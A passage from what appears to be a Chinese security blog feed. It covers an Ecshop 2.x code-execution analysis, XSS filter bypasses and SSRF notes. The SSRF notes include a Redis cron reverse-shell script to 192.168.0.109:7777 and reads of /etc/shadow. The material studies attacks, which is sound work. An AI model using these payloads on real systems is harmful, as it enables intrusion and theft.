alt="mark"></p><p><strong>这里需要满足一个条件，那就是传入的<code>$arr[&#39;id&#39;]</code>要与sql语句执行结果的<code>$row[&#39;position_id&#39;]</code>值相等，当这一条件满足，就将字符串<code>str:</code>与执行结果<code>$row[&#39;position_style&#39;]</code>连接后赋值给<code>$position_style</code>变量，这时<code>$position_style</code>的值变为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">str:&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></div></pre></td></tr></table></figure><p><strong>之后将<code>$position_style</code>再次传入<code>fetch</code>方法，这时候满足条件的代码部分如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">...省略部分</div><div class="line"><span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">    $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</div><div class="line">&#125;</div><div class="line">...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>可以看到这里就是存在二次漏洞的点，<code>_eval</code>函数将传入的<code>$position_style</code>,也就是sql语句执行的结果当做代码执行了，不过在<code>_eval</code>执行之前，传入了内容首先经过<code>substr</code>截取处理后传入了<code>fetch_str</code>函数，于是定位到<code>fetch_str</code>函数，相关代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理字符串函数</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string     $source</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</div><div class="line">    &#123;</div><div class="line">        $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</div><div class="line">    &#123;</div><div class="line">        $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</div><div class="line">        &#123;</div><div class="line">            $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</div><div class="line">        &#125;</div><div class="line">         <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</div><div class="line">        &#123;</div><div class="line">             $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</div><div class="line">        &#125;</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>传入的内容为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></div></pre></td></tr></table></figure><p><strong>这里绕过了第一个正则对危险字符的检测，直接到了函数代码最后一行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</div></pre></td></tr></table></figure><p><strong>这里将传入的内容进行匹配，<code>\\1</code>为匹配到的第一个元组，之后将匹配到的第一个元组值传入select函数，<code>\\1</code>的值如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>之后定位到<code>select</code>函数，关键代码部分如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理&#123;&#125;标签</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $tag</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">...省略部分</div><div class="line">    <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>因为传入的内容第一个字符为<code>$</code>，所以满足该条件分支，之后将传入的内容经过substr截取处理后传入了<code>get_val</code>函数，这时传入的参数值变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>定位到<code>get_val</code>函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">* 处理smarty标签中的变量标签</div><div class="line">*</div><div class="line">* @access  <span class="keyword">public</span></div><div class="line">* @param   string     $val</div><div class="line">*</div><div class="line">* @<span class="keyword">return</span>  bool</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></div><div class="line"><span class="function">    </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $moddb = explode(<span class="string">'|'</span>, $val);</div><div class="line">        $val = array_shift($moddb);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $all = explode(<span class="string">'.$'</span>, $val);</div><div class="line"></div><div class="line">      <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</div><div class="line">        &#125;</div><div class="line">        $p = implode(<span class="string">''</span>, $all);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        $p = <span class="keyword">$this</span>-&gt;make_var($val);</div><div class="line">    &#125;</div><div class="line">    ...省略部分</div><div class="line">    <span class="keyword">return</span> $p;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>由于传入的内容当中没有<code>[</code>、<code>|</code>和<code>.$</code>，所以不符合前三个条件，直接进入<code>make_var</code>函数，定位到<code>make_var</code>函数,相关的重要代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</div><div class="line">        &#123;</div><div class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</div><div class="line">        &#125;</div><div class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</div><div class="line">    &#125;</div><div class="line">    ...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>由于传入的内容里面没有<code>.</code>所以满足第一个条件分支，传入的最终payload<code>$val</code>值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>在拼接的时候闭合了前面<code>&#39;]</code>，之后$p变量的值变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']</span></div></pre></td></tr></table></figure><p><strong>之后<code>$p</code>依次经过<code>make_var</code>和<code>get_val</code>两个函数后返回到了<code>select</code>函数内，然后<code>select</code>函数拼接处理后返回值变为</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure><p><strong>之后回到<code>fetch_str</code>函数内，此时<code>preg_replace</code>的第二个参数<code>$this-&gt;select(&#39;\\1&#39;);</code>结果就变为了</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p><p><strong>之后<code>preg_replace</code>函数执行的结果就变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span>&#125;</span></div></pre></td></tr></table></figure><p><strong>之后上述值作为<code>fetch_str</code>函数的返回值会进入<code>_eval</code>函数内产生代码执行，执行phpinfo，<code>_eval</code>函数如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_eval</span><span class="params">($content)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    ob_start();</div><div class="line">    <span class="keyword">eval</span>(<span class="string">'?'</span> . <span class="string">'&gt;'</span> . trim($content));</div><div class="line">    $content = ob_get_contents();</div><div class="line">    ob_end_clean();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $content;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>最终php的<code>eval</code>函数执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ...省略部分<span class="meta">?&gt;</span>&#123;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span>&#125;</span></div></pre></td></tr></table></figure><p><strong>以上就是代码执行漏洞的执行过程，可以看到整个过程还是比较有意思的</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Ecshop2-x注入漏洞-amp-代码执行漏洞分析&quot;&gt;&lt;a href=&quot;#Ecshop2-x注入漏洞-amp-代码执行漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Ecshop2.x注入漏洞&amp;amp;代码执行漏洞分析&quot;&gt;&lt;/a&gt;Ecshop2.x注入漏洞&amp;amp;代码执行漏洞分析&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>XSS绕过之中文尖括号</title>
    <link href="https://c1aysec.github.io/2018/09/02/XSS%E7%BB%95%E8%BF%87%E4%B9%8B%E4%B8%AD%E6%96%87%E5%B0%96%E6%8B%AC%E5%8F%B7/"/>
    <id>https://c1aysec.github.io/2018/09/02/XSS绕过之中文尖括号/</id>
    <published>2018-09-02T15:02:20.000Z</published>
    <updated>2019-11-08T14:50:18.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS绕过之中文尖括号"><a href="#XSS绕过之中文尖括号" class="headerlink" title="XSS绕过之中文尖括号"></a>XSS绕过之中文尖括号</h1><p><strong>记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把<code>&gt;</code>变为了中文的尖括号<code>＞</code>，导致插入页面的<code>xss payload</code>不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~</strong><br><a id="more"></a></p><p><strong>过滤方式如下</strong><br><img src="http://pic.c1imber.top/blog/180902/1Bh572Bkmh.png?imageslim" alt="mark"><br><strong>可以看到对输入的过滤是将<code>&gt;</code>变为了中文的尖括号<code>＞</code>，这样的话浏览器在解析html标签时，由于标签无法正常闭合就会出现语法错误而导致<code>xss payload</code>无法被浏览器解析执行，加上页面可以利用的输出点只有这一个位置并且在DOM的文本节点，所以在构造<code>xss payload</code>的时候<code>&gt;</code>符号是必不可少的</strong></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p><strong>绕过其实也很简单，构造<code>payload</code>如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img onerror=alert(1) src=&gt;</div></pre></td></tr></table></figure><p><strong>输出点变成了下面的样子</strong><br><img src="http://pic.c1imber.top/blog/180902/gj0JFAL2gd.png?imageslim" alt="mark"><br><strong>这一点的构造思路正是用到了中文尖括号<code>＞</code>在浏览器解析时不能被浏览器识别的特点，这样的话<code>＞”&lt;/span</code>会被浏览器当成<code>img</code>标签的<code>src</code>属性的属性值，也就是一个错误的图片资源，导致后面<code>span</code>标签的<code>&gt;</code>逃逸，于是<code>span</code>标签的<code>&gt;</code>闭合了<code>img</code>标签，<code>xss payload执行</code></strong><br><img src="http://pic.c1imber.top/blog/180902/423EEemCIF.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180902/kHFi96gB60.png?imageslim" alt="mark"></p><h3 id="补充其它的绕过方法"><a href="#补充其它的绕过方法" class="headerlink" title="补充其它的绕过方法"></a>补充其它的绕过方法</h3><p><strong>经过交流群里师傅们的指点，发现对于这种只过滤了<code>&gt;</code>的<code>XSS</code>是很不安全的,因为浏览器的容错性，在html标签内，很多标签并不需要<code>&gt;</code>的闭合就可以解析html，所以绕过方法很多，例如：</strong></p><p><strong>payload:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180905/ela24g19CB.png?imageslim" alt="mark"><br><strong>使用firebug查看经过DOM渲染后的html代码，可以看到浏览器会自动的按照正确的html格式去补全标签</strong></p><p><strong>payload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg onload=alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure><p><strong>可以看到由于浏览器的容错性，标签也会被浏览器补全完整</strong><br><img src="http://pic.c1imber.top/blog/180905/kD1a3EEHel.png?imageslim" alt="mark"><br><strong>所以XSS的防御一定要完整的过滤转义<code>&lt;&gt;</code>这一对标签，仅仅只是过滤转义了<code>&gt;</code>还是很危险的</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;XSS绕过之中文尖括号&quot;&gt;&lt;a href=&quot;#XSS绕过之中文尖括号&quot; class=&quot;headerlink&quot; title=&quot;XSS绕过之中文尖括号&quot;&gt;&lt;/a&gt;XSS绕过之中文尖括号&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把&lt;code&gt;&amp;gt;&lt;/code&gt;变为了中文的尖括号&lt;code&gt;＞&lt;/code&gt;，导致插入页面的&lt;code&gt;xss payload&lt;/code&gt;不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>ssrf漏洞学习记录</title>
    <link href="https://c1aysec.github.io/2018/08/26/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2018/08/26/ssrf漏洞学习记录/</id>
    <published>2018-08-26T01:33:24.000Z</published>
    <updated>2019-11-08T14:28:50.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf漏洞原理以及利用方法"><a href="#ssrf漏洞原理以及利用方法" class="headerlink" title="ssrf漏洞原理以及利用方法"></a>ssrf漏洞原理以及利用方法</h1><p><strong>ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip</strong><br><a id="more"></a></p><h3 id="ssrf中一些可以利用的curl协议"><a href="#ssrf中一些可以利用的curl协议" class="headerlink" title="ssrf中一些可以利用的curl协议"></a>ssrf中一些可以利用的curl协议</h3><p><strong>ssrf的利用方式取决于服务器所支持的curl协议，之前自己为了做该实验升级了curl的版本为最新版本，目前Centos6的curl版本为<code>7.61.0</code>,查看一下其支持的协议</strong><br><img src="http://pic.c1imber.top/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><strong>首先使用curl本地测试一些ssrf的攻击方法</strong></p><p><strong>利用file协议读取服务器的文件：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"file:///etc/shadow"</span></div></pre></td></tr></table></figure></p><p><strong>权限比较大的话，直接读取系统影子文件,不过这种情况也只是在本地测试中以root用户运行curl时才会存在</strong><br><img src="http://pic.c1imber.top/blog/180826/7C2jmCKak0.png?imageslim" alt="mark"><br><strong>利用dict协议去进行服务版本探测：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"dict://127.0.0.1:22/info</span></div></pre></td></tr></table></figure></p><p><strong>进行ssh服务的版本探测</strong></p><p><img src="http://pic.c1imber.top/blog/180826/felI287dFD.png?imageslim" alt="mark"><br><strong>利用gopher协议扩大攻击面，攻击本地或者内网的一些脆弱的地方</strong></p><p><strong>举个栗子：比如redis数据库的默认配置允许可以直接在本地无需密码直接访问数据库，通过redis未授权访问漏洞可以通过在本地访问数据库，执行数据库语句，以利于redis未授权访问漏洞结合linux cron反弹shell为例</strong></p><p><strong>首先先写一个可以自动利用的shell脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi rediscron.sh</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\n\n"</span> | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> aaa</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x rediscron.sh</div></pre></td></tr></table></figure><p><strong>之后执行脚本: </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 6379</div></pre></td></tr></table></figure></p><p><strong>此时redis数据库的配置为没有修改的默认配置，我们可以通过本地访问redis去利用未授权访问漏洞反弹shell，可以看到执行脚本后成功在/var/spool/cron下创建了一个反弹shell的任务计划文件</strong><br><img src="http://pic.c1imber.top/blog/180826/fGLgBA73b9.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180826/kGb2F8f109.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180826/AcBK1kBhmD.png?imageslim" alt="mark"></p><p><strong>现在有一个问题就是如何将其转化为gopher协议的格式去利用，这里要利用到socat这个工具,去<a href="http://www.dest-unreach.org/socat/" title="socat官网" target="_blank" rel="external">socat官网</a>下载</strong><br><img src="http://pic.c1imber.top/blog/180826/gLCLjHD4AJ.png?imageslim" alt="mark"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz</div><div class="line">tar -zxvf socat-1.7.3.2.tar.gz</div><div class="line"><span class="built_in">cd</span> socat-1.7.3.2</div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure><p><strong>之后使用socat作为中间人代理抓取流量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div></pre></td></tr></table></figure><p><strong>这条命令的意思相当于是发往6379端口的数据会先经过本地的4444端口，相当于做了一个代理去抓包，可以理解为burpsuite抓包的原理</strong></p><p><strong>之后再次执行</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 4444</div></pre></td></tr></table></figure></p><p><strong>可以看到socat抓到了redis攻击的数据流量,具体内容如下:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&gt; 2018/08/25 01:51:28.003621  length=87 from=0 to=86</div><div class="line">*3\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">aaa\r</div><div class="line"><span class="variable">$58</span>\r</div><div class="line"></div><div class="line"></div><div class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1</div><div class="line"></div><div class="line"></div><div class="line">\r</div><div class="line">&lt; 2018/08/25 01:51:28.003804  length=5 from=0 to=4</div><div class="line">+OK\r</div><div 